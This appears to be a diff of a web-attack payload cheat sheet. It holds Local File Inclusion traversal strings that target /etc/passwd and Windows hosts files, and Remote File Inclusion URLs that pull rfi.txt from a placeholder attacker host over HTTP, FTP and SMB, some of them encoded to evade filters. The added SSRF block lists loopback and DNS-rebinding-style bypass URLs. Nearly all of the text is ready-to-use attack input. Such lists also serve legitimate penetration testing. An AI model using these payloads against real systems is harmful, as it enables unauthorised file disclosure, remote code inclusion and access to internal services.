@@ -22,6 +22,8 @@
 
 
 
+
+
 ==> LFI
 == Check Win
 /../../../../../../../../../windows/system32/drivers/etc/hosts
@@ -61,6 +63,7 @@ file://etc/passwd
 
 
 
+
 ==>  RFI
 http://<ATTACKER-IP>/rfi.txt
 hTTp://<ATTACKER-IP>/rfi.txt
@@ -79,6 +82,17 @@ ftp:%252f%252f<ATTACKER-IP>%252frfi.txt
 == Attivazione RFI via SMB
 \\<ATTACKER-IP>\share
 
+
+
+
+==> SSRF
+http://<ATTACKER-IP>
+http://127.1
+http://localhost.myDomain.com
+http://127.0.0.1.nip.io
+http://127.0.0.1
+http://127.0.0.1:8080
+file:///etc/passwd
 
 
 
@@ -116,10 +130,6 @@ admin'  %EF%B9%A3 %EF%B9%A3%EF%B9%A3
 
 
 
-==> SSRF
-ping 127.0.0.1
-== UTF-8 encoding
-ping %E2%91%A0%E2%91%A1%E2%91%A6.%E2%93%AA.%E2%93%AA.%E2%91%A0
  
 
 ==> XSS injection
